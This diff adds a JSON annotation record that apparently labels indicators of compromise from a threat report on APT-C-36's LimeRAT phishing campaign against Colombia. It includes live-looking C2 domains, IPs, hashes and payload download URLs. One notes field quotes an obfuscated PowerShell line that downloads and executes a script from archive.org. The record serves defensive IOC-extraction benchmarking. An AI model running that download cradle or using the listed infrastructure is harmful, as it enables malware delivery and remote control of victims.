@@ -1,0 +1,246 @@
+{
+  "report_id": "lab52_2021-05-17_literature-lover-targeting-colombia-with",
+  "source": {
+    "corpus": "AnnoCTR",
+    "file": "AnnoCTR/all/text/lab52_2021-05-17_literature-lover-targeting-colombia-with.txt",
+    "vendor": "lab52",
+    "published": "2021-05-17",
+    "license": "CC-BY-SA-4.0",
+    "url": null
+  },
+  "formats": [
+    "txt",
+    "html",
+    "pdf"
+  ],
+  "status": "frozen",
+  "annotators": [
+    "Mariana Malagón"
+  ],
+  "reviewers": [
+    "Juan Sebastián Ortega"
+  ],
+  "severity": "high",
+  "threat_actor": "APT-C-36",
+  "iocs": [
+    {
+      "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "type": "file_path",
+      "verdict": "benign",
+      "notes": "“C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” I`E`X((n`e`W`-Obj`E`c`T((‘Net.Webclient’))).((‘Downloadstri’+’ng’)).InVokE(((‘https://ia601509.us.archive.org/20/items/3\\_20210512\\_20210512"
+    },
+    {
+      "value": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe",
+      "type": "file_path",
+      "verdict": "benign",
+      "notes": "Infection Chain Among these different scripts, most of them trying to disable typical AntiVirus solutions, there is one implementing a technique a little more advanced than the rest of the techniques,"
+    },
+    {
+      "value": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe",
+      "type": "file_path",
+      "verdict": "benign",
+      "notes": "Infection Chain Among these different scripts, most of them trying to disable typical AntiVirus solutions, there is one implementing a technique a little more advanced than the rest of the techniques,"
+    },
+    {
+      "value": "santiagonasar.duckdns.org",
+      "type": "domain",
+      "verdict": "malicious",
+      "notes": "This actor chose the domain “santiagonasar.duckdns.org”, which is actually the name of the main character of Chronicle of a Death Foretold (Crónica de una muerte anunciada), a great novel written by G"
+    },
+    {
+      "value": "ff525bc3aade928db718dab395eeba0f886054c889dda2389a51628d58924ff5",
+      "type": "sha256",
+      "verdict": "malicious",
+      "notes": "| ff525bc3aade928db718dab395eeba0f886054c889dda2389a51628d58924ff5 |  |"
+    },
+    {
+      "value": "0a9a1e043d8138bb8fb257f07ac80c0fb8287eec1c131efff3a4302b13ec78c3",
+      "type": "sha256",
+      "verdict": "malicious",
+      "notes": "| 0a9a1e043d8138bb8fb257f07ac80c0fb8287eec1c131efff3a4302b13ec78c3 |  |"
+    },
+    {
+      "value": "https://nyc008.hawkhost.com/~invoixec/",
+      "type": "url",
+      "verdict": "malicious",
+      "notes": "| https://nyc008.hawkhost.com/~invoixec/ |  |"
+    },
+    {
+      "value": "santiagonasar2.duckdns.org",
+      "type": "domain",
+      "verdict": "malicious",
+      "notes": "| santiagonasar2.duckdns.org |  |"
+    },
+    {
+      "value": "cachanuevo.duckdns.org",
+      "type": "domain",
+      "verdict": "malicious",
+      "notes": "| cachanuevo.duckdns.org |  |"
+    },
+    {
+      "value": "2021cacha.duckdns.org",
+      "type": "domain",
+      "verdict": "malicious",
+      "notes": "| 2021cacha.duckdns.org |  |"
+    },
+    {
+      "value": "enviocacha.duckdns.org",
+      "type": "domain",
+      "verdict": "malicious",
+      "notes": "| enviocacha.duckdns.org |  |"
+    },
+    {
+      "value": "sosht.duckdns.org",
+      "type": "domain",
+      "verdict": "malicious",
+      "notes": "| sosht.duckdns.org |  |"
+    },
+    {
+      "value": "172.96.187.2",
+      "type": "ipv4",
+      "verdict": "malicious",
+      "notes": "| 172.96.187.2 |  |"
+    },
+    {
+      "value": "181.141.0.30",
+      "type": "ipv4",
+      "verdict": "malicious",
+      "notes": "| 181.141.0.30 |  |"
+    },
+    {
+      "value": "https://ia601509.us.archive.org/20/items/3_20210512_20210512_1430/3.txt",
+      "type": "url",
+      "verdict": "malicious",
+      "notes": "tabla de IoCs: script de la cadena descargado desde The Internet Archive (revision: estaba excluida como referencia)"
+    },
+    {
+      "value": "https://onedrive.live.com/download?cid=A4F059D1DE692167&resid=A4F059D1DE692167%21107&authkey=AOG1a9Z-hUIFbhI",
+      "type": "url",
+      "verdict": "malicious",
+      "notes": "tabla de IoCs: descarga del .rar inicial alojado en OneDrive (revision: estaba excluida por la lista de ruido del extractor)"
+    },
+    {
+      "value": "https://ia601509.us.archive.org/28/items/1_20210512_20210512_1427/1.txt",
+      "type": "url",
+      "verdict": "malicious",
+      "notes": "tabla de IoCs: script de la cadena descargado desde The Internet Archive (revision: estaba excluida como referencia)"
+    },
+    {
+      "value": "C:\\ProgramData\\Microsoft Arts\\Start\\",
+      "type": "file_path",
+      "verdict": "suspicious",
+      "notes": "carpeta donde la cadena deja sus scripts, nombre que imita a Microsoft (revision: el extractor la corto en el espacio)"
+    },
+    {
+      "value": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders",
+      "type": "registry_key",
+      "verdict": "benign",
+      "notes": "clave estandar de Windows abusada para persistencia (revision: la regex no reconoce 'HKCU:')"
+    }
+  ],
+  "excluded_iocs": [
+    {
+      "value": "https://lab52.io/blog/wp-content/uploads/2021/05/phichin-1024x506.png",
+      "type": "url",
+      "reason": "vendor_infrastructure",
+      "notes": "propuesto por el extractor (https://lab52.io/blog/wp-content/uploads/2021/05/phichin-102)"
+    },
+    {
+      "value": "https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-13-16-46-32-1.png",
+      "type": "url",
+      "reason": "vendor_infrastructure",
+      "notes": "propuesto por el extractor (https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-)"
+    },
+    {
+      "value": "https://lab52.io/blog/wp-content/uploads/2021/05/chain-1-1024x629.png",
+      "type": "url",
+      "reason": "vendor_infrastructure",
+      "notes": "propuesto por el extractor (https://lab52.io/blog/wp-content/uploads/2021/05/chain-1-102)"
+    },
+    {
+      "value": "https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-14-09-39-46-1024x60.png",
+      "type": "url",
+      "reason": "vendor_infrastructure",
+      "notes": "propuesto por el extractor (https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-)"
+    },
+    {
+      "value": "https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-14-16-18-35.png",
+      "type": "url",
+      "reason": "vendor_infrastructure",
+      "notes": "propuesto por el extractor (https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-)"
+    },
+    {
+      "value": "https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-14-16-32-41-1024x106.png",
+      "type": "url",
+      "reason": "vendor_infrastructure",
+      "notes": "propuesto por el extractor (https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-)"
+    },
+    {
+      "value": "https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-17-12-47-44.png",
+      "type": "url",
+      "reason": "vendor_infrastructure",
+      "notes": "propuesto por el extractor (https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-)"
+    },
+    {
+      "value": "https://twitter.com/1ZRR4H/status/1392789216141004802",
+      "type": "url",
+      "reason": "vendor_infrastructure",
+      "notes": "propuesto por el extractor (https://twitter.com/1ZRR4H/status/1392789216141004802)"
+    },
+    {
+      "value": "C:\\Users\\Public\\",
+      "type": "file_path",
+      "reason": "extraction_artifact",
+      "notes": "movido en la revision"
+    },
+    {
+      "value": "C:\\ProgramData\\Microsoft",
+      "type": "file_path",
+      "reason": "extraction_artifact",
+      "notes": "movido en la revision"
+    },
+    {
+      "value": "https://blog.360totalsecurity.com/en/new-infection-chain-of-njrat-variant/",
+      "type": "url",
+      "reason": "reference_only",
+      "notes": "movido en la revision"
+    },
+    {
+      "value": "shodan.io",
+      "type": "domain",
+      "reason": "reference_only",
+      "notes": "movido en la revision"
+    }
+  ],
+  "mitre_attack": [
+    {
+      "technique_id": "T1027",
+      "technique_name": "Obfuscated Files or Information"
+    },
+    {
+      "technique_id": "T1055",
+      "technique_name": "Process Injection"
+    },
+    {
+      "technique_id": "T1059",
+      "technique_name": "Command and Scripting Interpreter"
+    },
+    {
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer"
+    },
+    {
+      "technique_id": "T1547",
+      "technique_name": "Boot or Logon Autostart Execution"
+    },
+    {
+      "technique_id": "T1562",
+      "technique_name": "Impair Defenses"
+    },
+    {
+      "technique_id": "T1566",
+      "technique_name": "Phishing"
+    }
+  ],
+  "notes": "APT-C-36 contra objetivos en Colombia: phishing con citaciones judiciales falsas que entrega LimeRAT por una cadena de scripts. Severidad high: RAT con control remoto completo, campana dirigida y activa, seis dominios C2 en duckdns. powershell.exe, cvtres.exe y MSBuild.exe quedan benign a proposito: son binarios legitimos del sistema abusados (LOLBins) y marcarlos maliciosos seria el falso positivo que queremos poder medir. Las dos rutas excluidas las corto el extractor en el espacio y quedaron inservibles.\n\nAnotado indicador por indicador contra el texto del reporte (Mariana Malagón).\n\nRevision independiente (2026-11-02): Juan Sebastián Ortega, leyendo el reporte completo contra cada indicador, exclusion, severidad y actor. Cambios: tres URLs de la tabla de IoCs pasan de excluidas a malicious (descarga del .rar en OneDrive y dos scripts de la cadena en archive.org; las habia excluido la lista de ruido del extractor, el mismo patron que el C2 en EC2 de PurpleWave); se agrega la carpeta de drop 'C:\\ProgramData\\Microsoft Arts\\Start\\' (suspicious) y la clave de persistencia 'User Shell Folders' (benign), que la regex no reconoce."
+}
